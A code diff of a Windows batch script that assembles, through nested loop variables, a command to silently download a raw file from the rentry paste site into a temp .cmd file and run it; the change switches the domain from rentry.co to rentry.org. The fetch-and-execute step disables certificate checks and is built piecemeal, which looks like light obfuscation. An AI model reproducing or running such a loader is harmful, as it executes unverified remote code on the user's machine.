@@ -10,13 +10,13 @@ for %%a in (F6) do (
         for %%c in (.) do (
             for %%d in (cmd) do (
                 for %%e in (rentry) do (
-                    REM B - INSTALLER ID IN RENTRY.CO
+                    REM B - INSTALLER ID IN RENTRY.ORG
                     REM C - TEMP LOCATION
                     REM D - DOT
                     REM E - WORD "CMD"
                     REM F - WORD "rentry"
                     cls
-                    echo curl -#Lsko "%%~b6%%c%%d" "%%e%%cco/%%a/raw"
+                    echo curl -#Lsko "%%~b6%%c%%d" "%%e%%corg/%%a/raw"
                     echo call "%%~b6%%c%%d"
                 )
             )
